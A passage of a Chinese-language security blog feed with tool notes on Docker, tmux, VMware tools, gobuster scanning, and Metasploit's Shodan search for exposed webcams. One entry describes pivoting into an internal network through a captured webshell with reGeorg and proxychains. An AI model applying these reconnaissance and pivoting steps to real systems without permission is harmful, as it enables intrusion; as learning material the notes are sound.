-t命令，以tab标签新建一个自定义名称的容器。<br>注意最后的英文点号<br>注意，起容器名称的时候，长度不能太短，否则会报错<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-19-07/16.PNG" alt="16"></p><h2 id="dockerhub账号"><a href="#dockerhub账号" class="headerlink" title="dockerhub账号"></a>dockerhub账号</h2><p>dockerhub是之前一直说到的仓库，我们可以把它理解为github代码托管网站。<a href="https://hub.docker.com/signup">注册</a></p><p>注册以后，就有了私有仓库，叫做私有registry。可以将自己创建的image上传到私有仓库中。</p><h1 id="kali安装docker"><a href="#kali安装docker" class="headerlink" title="kali安装docker"></a>kali安装docker</h1><p>昨天费心的装了半天，结果<strong>一重启就报错</strong>，逐渐失去耐心。。。才发现kali安装docker比windows方便多了。。。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-19-07/13.PNG" alt="13"></p><p>参考资料： <a href="https://www.jianshu.com/p/f386ee4c6203">https://www.jianshu.com/p/f386ee4c6203</a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span>-key adv --keyserver hkp://p<span class="hljs-number">80</span>.pool.sks-keyservers.net:<span class="hljs-number">80</span> --recv-keys <span class="hljs-number">58118</span>E<span class="hljs-number">89</span>F<span class="hljs-number">3</span>A<span class="hljs-number">912897</span>C<span class="hljs-number">070</span>ADBF<span class="hljs-number">76221572</span>C<span class="hljs-number">52609</span>D<br><br><span class="hljs-attribute">echo</span> &#x27;deb https://apt.dockerproject.org/repo debian-stretch main&#x27; &gt; /etc/apt/sources.list.d/docker.list<br><br><span class="hljs-attribute">apt</span>-get -y install apt-transport-https ca-certificates<br><br><span class="hljs-attribute">apt</span>-get update &amp;&amp; sudo apt-get -y install docker-engine<br><br><span class="hljs-attribute">systemctl</span> start docker<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-19-07/15.PNG" alt="15"></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tmux终端管理</title>
    <link href="/2019/08/19/09-x/"/>
    <url>/2019/08/19/09-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：<a href="https://linuxize.com/post/getting-started-with-tmux/#installing-tmux-on-ubuntu-and-debian">https://linuxize.com/post/getting-started-with-tmux/#installing-tmux-on-ubuntu-and-debian</a></p><p>当关闭了一个终端，那么终端运行的命令也随之关闭了，为了达到关闭终端，但是后台仍然运行命令的目的，可以使用tmux。</p><p>现在我就来学习一下tmux的使用。</p><h2 id="开启新终端"><a href="#开启新终端" class="headerlink" title="开启新终端"></a>开启新终端</h2><p>tmux</p><h2 id="新建自定义名称的终端"><a href="#新建自定义名称的终端" class="headerlink" title="新建自定义名称的终端"></a>新建自定义名称的终端</h2><p>tmux new -s myteminal</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-19-09/21.PNG" alt="21"></p><h2 id="退出tmux"><a href="#退出tmux" class="headerlink" title="退出tmux"></a>退出tmux</h2><p>虽然退出了，但是在后台依然在运行<br><code>ctrl + b</code> + <code>d</code></p><h2 id="查看tmux终端"><a href="#查看tmux终端" class="headerlink" title="查看tmux终端"></a>查看tmux终端</h2><p>tmux ls</p><p>图中显示有两个终端，编号为0和1<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-19-09/22.PNG" alt="22"></p><h2 id="打开终端"><a href="#打开终端" class="headerlink" title="打开终端"></a>打开终端</h2><p>tmux attach-session -t 0<br>打开编号为0的终端</p><h2 id="tmux-快捷键"><a href="#tmux-快捷键" class="headerlink" title="tmux 快捷键"></a>tmux 快捷键</h2><ul><li>  <code>Ctrl+b</code> <code>c</code> 新建窗口</li><li>  <code>Ctrl+b</code> <code>w</code> 选择开启的某窗口，通过数字编号</li><li>  <code>Ctrl+b</code> <code>0</code> 切换到窗口0，数字0可以自定义</li></ul><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-19-09/23.PNG" alt="23"></p><ul><li>  <code>Ctrl+b</code> <code>,</code> 为当前窗口重命名</li><li>  <code>Ctrl+b</code> <code>%</code> 将当前窗口分割为左右两部分</li></ul><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-19-09/25.PNG" alt="25"></p><ul><li><p>  <code>Ctrl+b</code> <code>&quot;</code> 将当前窗口分割为上下两部分<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-19-09/24.PNG" alt="24"></p></li><li><p>  <code>Ctrl+b</code> <code>o</code> 切换到另一个窗口</p></li><li><p>  <code>Ctrl+b</code> <code>;</code> 从当前窗口切换到之前的窗口</p></li><li><p>  <code>Ctrl+b</code> <code>x</code> 关闭现有窗口，输入y/n，关闭窗口以及运行的命令</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker（二）安装&amp;使用</title>
    <link href="/2019/08/15/04-x/"/>
    <url>/2019/08/15/04-x/</url>
    
    <content type="html"><![CDATA[<p>上一篇：<a href="https://whale3070.github.io/tools/2019/08/05/05-x/">Docker（一）</a></p><p>参考资料：</p><ul><li><p><a href="https://www.runoob.com/docker/docker-tutorial.html">https://www.runoob.com/docker/docker-tutorial.html</a></p></li><li><p><a href="https://www.ibm.com/developerworks/community/blogs/jfp/entry/running_ipython_notebooks_in_a_docker_container_on_windows?lang=en">https://www.ibm.com/developerworks/community/blogs/jfp/entry/running_ipython_notebooks_in_a_docker_container_on_windows?lang=en</a></p></li><li><p><a href="https://docs.docker.com/toolbox/">https://docs.docker.com/toolbox/</a></p></li></ul><hr><h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p><a href="https://linuxhint.com/install_docker_kali_linux/">https://linuxhint.com/install_docker_kali_linux/</a></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>参考资料：《第一本docker书》</p><p>开启docker服务端，点击docker-machine.exe，会看到一个黑窗口一闪而过。不要担心，不是病毒。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-15-04/8.PNG" alt="8"></p><h2 id="运行一个容器"><a href="#运行一个容器" class="headerlink" title="运行一个容器"></a>运行一个容器</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">docker run -i -t ubuntu <span class="hljs-regexp">/bin/</span>bash<br><br>-i   input<br>-t output<br> 开启<span class="hljs-regexp">/bin/</span>bash终端的输入输出功能。<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-15-04/9.PNG" alt="9"></p><p>现在创建了一个docker镜像。unable to find image，的意思是，本地没有这个镜像，于是从服务器上取得这个镜像到本地。</p><p>运行hostname、ps -aux等命令，可以看到容器内的ubuntu成功执行了。</p><h2 id="新建但是不运行容器"><a href="#新建但是不运行容器" class="headerlink" title="新建但是不运行容器"></a>新建但是不运行容器</h2><p><code>docker create xxx</code></p><h2 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h2><p>输入<code>exit</code>，即可退出新建的ubuntu这个容器。</p><h2 id="开启容器"><a href="#开启容器" class="headerlink" title="开启容器"></a>开启容器</h2><p><code>docker start 容器的id</code></p><p><code>docker restart 容器id</code> 重启</p><h2 id="查看容器id"><a href="#查看容器id" class="headerlink" title="查看容器id"></a>查看容器id</h2><p><code>docker ps -a</code></p><h2 id="重命名容器"><a href="#重命名容器" class="headerlink" title="重命名容器"></a>重命名容器</h2><p><code>docker rename 指定一个容器 指定名称</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-15-04/10.PNG" alt="10"></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shodan+msf</title>
    <link href="/2019/08/07/04-x/"/>
    <url>/2019/08/07/04-x/</url>
    
    <content type="html"><![CDATA[<p><a href="https://thor-sec.com/cheatsheet/shodan/shodan_cheat_sheet/">https://thor-sec.com/cheatsheet/shodan/shodan_cheat_sheet/</a></p><p><a href="https://www.exploit-db.com/docs/english/33859-searching-shodan-for-fun-and-profit.pdf">https://www.exploit-db.com/docs/english/33859-searching-shodan-for-fun-and-profit.pdf</a></p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">msfconsole<br><span class="hljs-keyword">use</span> auxiliary/gather/shodan_search<br><span class="hljs-keyword">set</span> shodan_apikey xxx<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">QUERY</span> webcamxp  <span class="hljs-comment">//webcamXP是一款国外软件,使用广泛的私人和专业用途的网络视频捕捉软件</span><br><span class="hljs-comment">//query是设置查询语句的意思</span><br>这个<span class="hljs-keyword">query</span>怎么用，可以参考上述链接2<br><br><span class="hljs-keyword">run</span> 运行搜索语法<br></code></pre></div></td></tr></table></figure><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>set QUERY webcamxp</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-07-04/2.PNG" alt="2"></p><hr><p>set QUERY port:”21”</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-07-04/3.PNG" alt="3"></p><h2 id="搜索语法"><a href="#搜索语法" class="headerlink" title="搜索语法"></a>搜索语法</h2><p><a href="https://www.freebuf.com/sectool/121339.html">https://www.freebuf.com/sectool/121339.html</a></p><p>参考上面这篇文章的搜索实例</p><p>msf中输入以下的的搜索语句：<br><code>set query xx</code><br>这里的xx就是在网页版搜索的字符串。</p><p>例如，在网页上搜索<code>port:&quot;21&quot;</code><br>那么在msf输入的语句就是：<code>set query port:&quot;21&quot;</code></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker（一）什么是docker</title>
    <link href="/2019/08/05/05-x/"/>
    <url>/2019/08/05/05-x/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html">参考：Docker 入门教程</a></p><h2 id="什么是docker"><a href="#什么是docker" class="headerlink" title="? 什么是docker"></a>? 什么是docker</h2><p>它是一种虚拟化技术，是为了解决<strong>软件兼容</strong>问题而生的。</p><p>会Linux的同学都知道，有时候你安装一个软件，它需要某个库，于是你就会输入“apt-get install xxx”，有时候它需要不止一个依赖，而且有时候会报各种各样的错误。有些软件需要python环境、有些软件需要java环境、有些需要<code>.net</code>框架。</p><p>如果有一个系统，应用软件已经搭建好了。在信息技术中，docker就是这样一种技术。用户可以”开盖即食“，类似于真空包装熟食的这样一种技术。</p><h2 id="？-docker与Virtual-Machine的区别"><a href="#？-docker与Virtual-Machine的区别" class="headerlink" title="？ docker与Virtual Machine的区别"></a>？ <code>docker</code>与<code>Virtual Machine</code>的区别</h2><p>docker技术开始于2013年，而虚拟化技术在20世纪70年代已经在大型机上应用。</p><p>docker的<strong>最小单位</strong>是应用——application，VM的最小单位是操作系统——operation system.</p><p>它是linux容器，一种虚拟化技术，将计算机的硬件资源<strong>抽象</strong>出来，<strong>模拟</strong>为多台计算机。<br>它与虚拟机不同，虚拟机是完全模拟（有完整的操作系统等），而Docker是直接调用硬件对操作系统的接口，无需中间层，速度达到了秒级。</p><h2 id="？什么是云计算"><a href="#？什么是云计算" class="headerlink" title="？什么是云计算"></a>？什么是云计算</h2><p>云计算（Cloud Computing）是分布式计算（Distributed Computing）、并行计算（Parallel Computing）、效用计算（Utility Computing）、 网络存储（Network Storage Technologies）、虚拟化（Virtualization）、负载均衡（Load Balance）、热备冗余（High Available）等传统计算机和网络技术发展融合的产物。</p><p>未来的云计算，就像我们使用水电煤气一样，我们从来不会想着去建电厂，也不关心电厂在哪里，只要插上插头，就能用电。</p><p> 真正的云计算一定有两个重要的基础条件：</p><ol><li> 计算资源的虚拟化，按计算能力购买才是真正的云计算，目前的虚拟机嘛，嗯，看不到机器心里不踏实。</li><li> 云计算能力的弹性伸缩能力，一定是想用多少就是多少，不用的时候就不要，目前的专有云嘛，嗯，机器不放在我这里心里也不踏实。(本段转载自知乎)</li></ol><p>延伸阅读：<a href="https://zhuanlan.zhihu.com/p/28959570">https://zhuanlan.zhihu.com/p/28959570</a></p><h2 id="使用方式？"><a href="#使用方式？" class="headerlink" title="使用方式？"></a>使用方式？</h2><p>docker是跨平台的，常见的操作系统都可以安装使用。<br>介绍windows10，安装使用。<br><a href="https://store.docker.com/editions/community/docker-ce-desktop-windows">下载地址</a></p><ul><li>安装之前要关闭所有的软件，因为安装docker会重启多次。</li></ul><p>1.安装成功后，可以看到<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-05-05/%E6%8D%95%E8%8E%B7.PNG"><br>接下来，我们注册一个docker社区的账号。<br><a href="https://cloud.docker.com/">注册地址</a></p><p>2.注册时候需要翻墙，否则可能刷不出验证码。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-05-05/%E6%8D%95%E8%8E%B7%203.PNG"></p><p>注册成功后，登陆你填写的邮箱地址，进行邮箱认证。点击邮件给出的连接，就可以登陆docker社区了。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-05-05/%E6%8D%95%E8%8E%B7%202.PNG" alt="捕获 2"></p><p>3.运行<br>打开命令命令提示符，快捷键win+R，cmd。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-05-05/%E6%8D%95%E8%8E%B7%204.PNG" alt="捕获 4"></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>proxychains&amp;reGeorg</title>
    <link href="/2019/08/02/05-x/"/>
    <url>/2019/08/02/05-x/</url>
    
    <content type="html"><![CDATA[<h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><p>简介：linux平台，全局代理</p><p>使用方法：<br>kali teminal<br><code>locate proxychains</code><br><code>leafpad /etc/proxychains.conf</code></p><p>首先需要修改proxychains配置，然后使用代理。</p><blockquote><p>案例：proxychains firefox<br>火狐浏览器用代理访问网络。</p></blockquote><h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>这是一个内网渗透软件，当拿到一个webshell的时候，就可以让目标服务器作为代理，访问内网。</p><p>之前我们介绍过lcx等代理，区别有哪些呢？</p><p><strong>下表中，目标机器简称为A；O代表是，X代表否</strong></p><table><thead><tr><th>A处于内网</th><th>A可以访问外网</th><th>有防火墙</th><th>工具</th></tr></thead><tbody><tr><td>O</td><td>O</td><td>X</td><td>lcx</td></tr><tr><td>O</td><td>O</td><td>O</td><td>lcx免杀</td></tr><tr><td>O</td><td>X</td><td>O</td><td>reGeorg</td></tr></tbody></table><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ol><li>使用reGeorg<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> reGeorgSocksProxy.py -u http://你的目标网站地址/tunnel.jsp -p <span class="hljs-number">1080</span><br>- 这条命令的作用是，添加本地代理 <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">1080</span>端口<br>这个<span class="hljs-number">1080</span>是可以修改/随意设置的。<br>- 目的是为了让处于内网的服务器，获得的流量转发到本地<span class="hljs-number">1080</span>端口<br></code></pre></div></td></tr></table></figure></li><li>使用proxychains</li></ol><p>因为之前我们把远程服务器的流量转发到了1080，所以要通过本地1080端口进行交互。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>proxychains.conf 修改本地配置，目的是让想要的软件走代理地址<span class="hljs-string">&quot;127.0.0.1 1080&quot;</span><br><br>修改最好一行为如下配置<br>socks4 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1080</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录一下vmware安装vmtools</title>
    <link href="/2019/08/01/11-x/"/>
    <url>/2019/08/01/11-x/</url>
    
    <content type="html"><![CDATA[<h1 id="记录一下vmware安装vmtools"><a href="#记录一下vmware安装vmtools" class="headerlink" title="记录一下vmware安装vmtools"></a>记录一下vmware安装vmtools</h1><p>参考资料：<a href="https://docs.vmware.com/en/VMware-Workstation-Pro/15.0/com.vmware.ws.using.doc/GUID-08BB9465-D40A-4E16-9E15-8C016CC8166F.html">https://docs.vmware.com/en/VMware-Workstation-Pro/15.0/com.vmware.ws.using.doc/GUID-08BB9465-D40A-4E16-9E15-8C016CC8166F.html</a></p><h2 id="remnux安装vmtools"><a href="#remnux安装vmtools" class="headerlink" title="remnux安装vmtools"></a>remnux安装vmtools</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-regexp">/mnt/</span>cdrom<br><br>mount <span class="hljs-regexp">/dev/</span>cdrom <span class="hljs-regexp">/mnt/</span>cdrom<br><br>cd <span class="hljs-regexp">/tmp               因为/m</span>nt/cdrom是只读目录，所以要切换tmp目录<br><br>tar zxpf <span class="hljs-regexp">/mnt/</span>cdrom/VMwareTools-xxx.tar.gz 解压到tmp目录，发现多了一个vmware-tools-distrib<br><br>cd vmware-tools-distrib<br><br>./vmware-install.pl<br><br>一路回车，即可完成vmtools的安装<br><br></code></pre></div></td></tr></table></figure><p>当你点击“虚拟机”菜单栏，显示“重新安装 vmware tools，说明安装成功。</p><h2 id="kali安装vmtools"><a href="#kali安装vmtools" class="headerlink" title="kali安装vmtools"></a>kali安装vmtools</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/08-01-11/1.PNG" alt="1"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">cp VMwareTools-10.2.5-8068393.tar.gz <span class="hljs-string">/tmp</span><br><span class="hljs-keyword">cd</span> tmp<br>tar -zxvf VMwareTools-10.2.5-8068393.tar.gz <br><span class="hljs-keyword">cd</span> vmware-tools-distrib/<br><span class="hljs-string">./vmware-install.pl</span> <br><span class="hljs-keyword">history</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gobuster-web目录扫描</title>
    <link href="/2019/07/31/11-x/"/>
    <url>/2019/07/31/11-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：<a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></p><p>由于vps有公网IP，在某些时候可以达到<strong>隐藏真实IP</strong>、<strong>（直接访问外网）网速更快</strong>等效果</p><p>下面开始配置vps上的扫描器gobuster。</p><h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">wget</span> <span class="hljs-string">http://ftp.br.debian.org/debian/pool/main/g/gobuster/gobuster_2.0.1-1_i386.deb</span><br><span class="hljs-string">dpkg</span> <span class="hljs-string">-i</span> <span class="hljs-string">gobuster_2.0.1-1_i386.deb</span><br><span class="hljs-string">gobuster</span> <span class="hljs-string">-h</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">git</span> <span class="hljs-string">clone</span> <span class="hljs-string">https://github.com/OJ/gobuster</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">apt-get</span> <span class="hljs-string">gobuster</span><br></code></pre></div></td></tr></table></figure><h2 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h2><p>目前的版本v3.0.1 （2019年7月），参数与之前的版本不兼容。</p><p>目录扫描：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">gobuster dir -u http:<span class="hljs-regexp">//</span>IP -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt<br> -o scan-result.txt <br></code></pre></div></td></tr></table></figure><p>修改user-agent HTTP头:</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">gobuster dir -u http:<span class="hljs-regexp">//</span>IP -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster<span class="hljs-regexp">/directory-list-2.3-medium.txt --useragent &quot;Mozilla/</span><span class="hljs-number">5.0</span> (X11; Linux x86_64; rv:<span class="hljs-number">60.0</span>) Gecko<span class="hljs-regexp">/20100101 Firefox/</span><span class="hljs-number">60.0</span><span class="hljs-string">&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="linux-shell批量扫描url"><a href="#linux-shell批量扫描url" class="headerlink" title="linux shell批量扫描url"></a>linux shell批量扫描url</h2><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">a=1<br>for line in $(cat url)<br>do<br>    #echo $&#123;a&#125;<br>    gobuster dir -u $&#123;line&#125; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o $&#123;a&#125;.txt -q<br>    #echo $line<br>    sed -i &quot;1 i$line&quot; $&#123;a&#125;.txt<br>    a=$(( $a + 1 ))<br>done<br></code></pre></div></td></tr></table></figure><p>将url写入<code>url.txt</code>，然后运行该脚本即可。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-31-11/22.PNG" alt="22"></p><p>遇到的问题：因为是单线程的，其中一个url扫描出现问题，gobuster可能会出问题。以后学下多线程怎么写脚本。</p><h2 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h2><p>需要一个字典，包括常见的英文缩写<br>需要一个上级域名，例如google.com。<br>gobuster会将字典与给出的域名组合起来，如果存在，就提示发现子域名。</p><p><code>gobuster dns -d  顶级域名 -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-31-11/23.PNG" alt="22"></p>]]></content>
    
    
    <categories>
      
      <category>scan</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>node总结-web蜘蛛爬行失败怎么办</title>
    <link href="/2019/07/31/12-x/"/>
    <url>/2019/07/31/12-x/</url>
    
    <content type="html"><![CDATA[<p>上一篇： <a href="https://whale3070.github.io/training/2018/10/13/node-%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2+%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9B%B8%E5%85%B3/">Node（源码泄露+密码学相关）</a></p><p>因为没有遇到过的新东西有点多，所以新开一篇。</p><h2 id="？web扫描失败怎么办。"><a href="#？web扫描失败怎么办。" class="headerlink" title="？web扫描失败怎么办。"></a>？web扫描失败怎么办。</h2><p>answer: 用burp proxy拦截，查看是否是user-agent字段导致的。用gobuster可以修改http头，再次扫描。</p><p>一开始我用的dirbuster，提示你扫描的页面不符。<br>当初我没有想太多，就用了paros，找到了那个MD5密码所在的页面。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-31-12/Screenshot%20from%202018-10-13%2000-56-33.png" alt="Screenshot from 2018-10-13 00-56-33"></p><p>其实还是值得总结一下。</p><h4 id="监听本地端口"><a href="#监听本地端口" class="headerlink" title="监听本地端口"></a>监听本地端口</h4><p>访问任何页面，目标机的地址都会跳转回主页，于是用burp:<br>添加一个监听代理<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-31-12/4.PNG" alt="4"></p><p>添加监听目标的ip和端口<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-31-12/1.PNG" alt="1"></p><p>访问代理监听的localhost:8081，等于访问192.168.1.129:3000<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-31-12/3.PNG" alt="3"></p><h4 id="扫描本地端口"><a href="#扫描本地端口" class="headerlink" title="扫描本地端口"></a>扫描本地端口</h4><p>确保burp intercept is on ，拦截开启<br>进行扫描，然后返回burp<br><code>gobuster -u http://localhost:8081 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt </code></p><p>点击forward，将数据包放过，然后在http history里可以查看。可以将想要的数据包右键发送到repeater。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/07-31-12/2.PNG" alt="2"><br>可以看到因为是gobuster的user-agent，所以目标主机进行了拦截。<br>如果我们换成firefox的请求头，或者直接删除user-agent。目标网站显示正常页面。</p><p>所以通过自定义gobuster用户请求头，就可以进行正常网站爬行。</p><h2 id="乱码的文件"><a href="#乱码的文件" class="headerlink" title="乱码的文件"></a>乱码的文件</h2><p>用file命令再识别一下。编码一次难道就不能再加密了吗(；′⌒`)</p><h2 id="？mongo数据库的使用"><a href="#？mongo数据库的使用" class="headerlink" title="？mongo数据库的使用"></a>？mongo数据库的使用</h2><h4 id="什么关系型、非关系型数据库？"><a href="#什么关系型、非关系型数据库？" class="headerlink" title="什么关系型、非关系型数据库？"></a>什么关系型、非关系型数据库？</h4><p>sql = structure query language = 结构化查询语句<br>sql就是通用的<strong>关系型数据库语言</strong>。</p><p>no sql ，是sql的阉割版，就是说<strong>非关系数据库功能更少</strong>。<br>其实对于某些用户使用计算机来说，装qq和影视播放器加浏览器就够了。<br>非关系型数据库也是一样的道理。</p><h4 id="关于mongodb"><a href="#关于mongodb" class="headerlink" title="关于mongodb"></a>关于mongodb</h4><p>Mongo Shell 是 JS 作为主语言的。</p><p>MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是<strong>非关系数据库</strong>当中功能最丰富，最像关系数据库的。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>awvs和appscan登陆扫描</title>
    <link href="/2019/07/30/09-x/"/>
    <url>/2019/07/30/09-x/</url>
    
